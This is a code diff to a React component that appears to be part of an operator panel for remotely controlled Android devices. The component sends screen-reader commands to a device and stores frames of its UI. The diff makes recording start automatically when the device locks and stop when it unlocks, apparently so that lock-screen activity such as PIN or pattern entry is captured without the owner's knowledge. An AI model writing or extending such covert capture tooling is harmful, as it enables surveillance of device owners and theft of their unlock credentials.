@@ -3,6 +3,7 @@ import React, { useState, useRef, useEffect, useCallback } from 'react';
 const PHONE_W = 320;
 const PHONE_H = 680;
 const LOCK_PKG = 'com.android.systemui';
+const MAX_RECORDINGS = 100;
 
 const LAUNCHER_PKGS = new Set([
   'com.android.launcher', 'com.android.launcher2', 'com.android.launcher3',
@@ -74,6 +75,14 @@ function renderFrameElements(screenData, devW, devH) {
     });
 }
 
+function addRecording(prev, rec) {
+  const next = [rec, ...prev];
+  if (next.length > MAX_RECORDINGS) {
+    return next.slice(0, MAX_RECORDINGS);
+  }
+  return next;
+}
+
 export default function ScreenReaderRecorder({ device, sendCommand, screenReaderPushData }) {
   const deviceId = device?.deviceId;
   const isOnline = device?.isOnline;
@@ -84,23 +93,21 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
   const [isRecording, setIsRecording]     = useState(false);
   const [recordings, setRecordings]       = useState([]);
   const [currentFrames, setCurrentFrames] = useState([]);
-  const [recInterval, setRecInterval]     = useState(500);
 
-  const [playing, setPlaying]           = useState(null);
-  const [playIdx, setPlayIdx]           = useState(0);
-  const [isPlaying, setIsPlaying]       = useState(false);
-  const [playSpeed, setPlaySpeed]       = useState(500);
+  const [playing, setPlaying]       = useState(null);
+  const [playIdx, setPlayIdx]       = useState(0);
+  const [isPlaying, setIsPlaying]   = useState(false);
+  const [playSpeed, setPlaySpeed]   = useState(500);
 
   const isRecordingRef  = useRef(false);
   const framesRef       = useRef([]);
   const playTimerRef    = useRef(null);
   const prevPkgRef      = useRef(null);
-  const recStartTimeRef = useRef(null);
 
   useEffect(() => { isRecordingRef.current = isRecording; }, [isRecording]);
 
-  const stopRecording = useCallback((frames) => {
-    sendCommand(deviceId, 'screen_reader_stop', {});
+  const stopRecording = useCallback((frames, sendStopCmd = true) => {
+    if (sendStopCmd) sendCommand(deviceId, 'screen_reader_stop', {});
     setIsRecording(false);
     isRecordingRef.current = false;
     const captured = frames || framesRef.current;
@@ -109,26 +116,48 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
         id: Date.now(),
         label: `Recording ${new Date().toLocaleTimeString()}`,
         frames: captured,
-        duration: captured.length * recInterval,
+        duration: captured.length * 1000,
         frameCount: captured.length,
       };
-      setRecordings(prev => [rec, ...prev]);
+      setRecordings(prev => addRecording(prev, rec));
     }
     framesRef.current = [];
     setCurrentFrames([]);
     prevPkgRef.current = null;
-  }, [deviceId, sendCommand, recInterval]);
+  }, [deviceId, sendCommand]);
 
-  const startRecording = useCallback(() => {
+  const startRecording = useCallback((auto = false) => {
     framesRef.current = [];
     setCurrentFrames([]);
     prevPkgRef.current = null;
-    recStartTimeRef.current = Date.now();
-    sendCommand(deviceId, 'screen_reader_start', { intervalMs: recInterval });
+    if (!auto) {
+      sendCommand(deviceId, 'screen_reader_start', {});
+    }
     setIsRecording(true);
-  }, [deviceId, sendCommand, recInterval]);
+    isRecordingRef.current = true;
+  }, [deviceId, sendCommand]);
 
   useEffect(() => {
+    if (!screenReaderPushData) return;
+
+    const autoEvent = screenReaderPushData.autoEvent;
+
+    if (autoEvent === 'start') {
+      framesRef.current = [];
+      setCurrentFrames([]);
+      prevPkgRef.current = null;
+      setIsRecording(true);
+      isRecordingRef.current = true;
+      return;
+    }
+
+    if (autoEvent === 'stop') {
+      if (isRecordingRef.current) {
+        stopRecording(framesRef.current, false);
+      }
+      return;
+    }
+
     if (!isRecordingRef.current) return;
     if (!screenReaderPushData?.success || !screenReaderPushData?.screen) return;
 
@@ -138,10 +167,7 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
     const prevPkg = prevPkgRef.current;
     prevPkgRef.current = pkg;
 
-    const frame = {
-      ts: Date.now(),
-      screen,
-    };
+    const frame = { ts: Date.now(), screen };
     framesRef.current = [...framesRef.current, frame];
     setCurrentFrames([...framesRef.current]);
 
@@ -218,10 +244,8 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
           boxShadow: isRecording ? '0 0 18px rgba(220,38,38,0.25)' : '0 4px 20px rgba(0,0,0,0.4)',
           transition: 'border-color 0.3s, box-shadow 0.3s',
         }}>
-          {/* Notch */}
           <div style={{ width: 56, height: 5, background: '#334155', borderRadius: 4, marginBottom: 2 }} />
 
-          {/* Screen area */}
           <div style={{
             width: PHONE_W, height: PHONE_H,
             background: displayFrame ? '#101828' : '#0a0f1e',
@@ -232,14 +256,13 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
               <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', color: '#334155', gap: 8 }}>
                 <div style={{ fontSize: 36 }}>🎥</div>
                 <div style={{ fontSize: 11, color: '#475569' }}>
-                  {isRecording ? 'Waiting for frame…' : playing ? 'No frame' : 'Press Record to start'}
+                  {isRecording ? 'Waiting for frame…' : playing ? 'No frame' : 'Auto-records when locked'}
                 </div>
               </div>
             )}
 
             {displayFrame && (
               <>
-                {/* Status bar */}
                 <div style={{
                   position: 'absolute', top: 0, left: 0, right: 0, height: 20,
                   background: 'rgba(0,0,0,0.8)', display: 'flex', alignItems: 'center',
@@ -257,14 +280,12 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
             )}
           </div>
 
-          {/* Live frame counter */}
           {isRecording && (
             <div style={{ fontSize: 10, color: '#ef4444', fontWeight: 700 }}>
               ● {currentFrames.length} frame{currentFrames.length !== 1 ? 's' : ''} captured
             </div>
           )}
 
-          {/* Playback scrubber */}
           {playing && playing.frames.length > 1 && (
             <div style={{ width: PHONE_W, display: 'flex', flexDirection: 'column', gap: 4 }}>
               <input
@@ -283,32 +304,16 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
             </div>
           )}
 
-          {/* Home bar */}
           <div style={{ width: 60, height: 4, background: '#334155', borderRadius: 4, marginTop: 2 }} />
         </div>
 
-        {/* Controls below phone */}
+        {/* Controls — only Start / Stop */}
         <div style={{ display: 'flex', gap: 6, justifyContent: 'center', flexWrap: 'wrap' }}>
           {!isRecording ? (
-            btn('● Record', startRecording, '#7f1d1d', !isOnline)
+            btn('● Record', () => startRecording(false), '#7f1d1d', !isOnline)
           ) : (
             btn('⏹ Stop', () => stopRecording(), '#dc2626')
           )}
-
-          <select
-            value={recInterval}
-            onChange={e => setRecInterval(Number(e.target.value))}
-            disabled={isRecording}
-            style={{
-              background: '#1e293b', color: '#94a3b8', border: '1px solid #334155',
-              borderRadius: 6, padding: '4px 8px', fontSize: 11,
-            }}
-          >
-            <option value={300}>0.3s</option>
-            <option value={500}>0.5s</option>
-            <option value={1000}>1s</option>
-            <option value={2000}>2s</option>
-          </select>
 
           {playing && (
             <>
@@ -341,7 +346,7 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
       {/* Recordings list */}
       <div style={{ flex: 1, minWidth: 220, display: 'flex', flexDirection: 'column', gap: 6 }}>
         <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700 }}>
-          🎞 Recordings ({recordings.length})
+          🎞 Recordings ({recordings.length}/{MAX_RECORDINGS})
         </div>
 
         {recordings.length === 0 && (
@@ -352,7 +357,7 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
           }}>
             <span style={{ fontSize: 28 }}>🎞</span>
             <span style={{ fontSize: 12 }}>No recordings yet</span>
-            <span style={{ fontSize: 11 }}>Press Record while on the lock screen.<br />Stops automatically when device unlocks.</span>
+            <span style={{ fontSize: 11 }}>Auto-records when device is locked.<br />Stops and saves when unlocked or screen turns off.</span>
           </div>
         )}
 
@@ -403,13 +408,15 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
               </button>
             </div>
 
-            {/* Frame strip preview */}
             {rec.frameCount > 0 && (
               <div style={{ display: 'flex', gap: 3, overflowX: 'auto', paddingBottom: 2 }}>
                 {rec.frames.map((f, fi) => (
                   <div
                     key={fi}
-                    onClick={() => { if (playing?.id === rec.id) { stopPlayback(); setPlayIdx(fi); } else { startPlayback(rec); setTimeout(() => { stopPlayback(); setPlayIdx(fi); }, 50); } }}
+                    onClick={() => {
+                      if (playing?.id === rec.id) { stopPlayback(); setPlayIdx(fi); }
+                      else { startPlayback(rec); setTimeout(() => { stopPlayback(); setPlayIdx(fi); }, 50); }
+                    }}
                     style={{
                       width: 28, height: 48, flexShrink: 0,
                       background: fi === playIdx && playing?.id === rec.id ? '#7c3aed22' : '#0f172a',
